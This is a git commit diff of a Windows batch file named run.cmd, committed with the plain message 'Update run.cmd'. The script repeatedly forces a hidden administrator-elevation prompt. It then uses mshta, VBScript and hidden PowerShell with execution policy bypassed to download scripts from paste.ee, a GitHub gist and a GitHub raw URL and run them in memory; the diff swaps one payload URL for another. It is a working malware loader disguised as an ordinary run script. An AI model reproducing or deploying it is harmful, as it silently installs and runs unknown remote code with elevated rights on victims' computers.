68f55efa2f922975c36943d4799ad2ec310d5abf
43a1723 <hai1723notgay@gmail.com>
2024-08-10 19:42:12 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -4,6 +4,6 @@ cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 :: powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
-mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://paste.ee/r/kd2r4/0') | iex""",0)(window.close)
+mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://gist.githubusercontent.com/43a1723/f4a29a106e24af9d7fc9d77d1c5614a3/raw/ed859f60109734a2d0d9072e90d74c242fe9cce4/gistfile1.txt') | iex""",0)(window.close)
 timeout /t 3 /nobreak
 mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1') | iex""",0)(window.close)
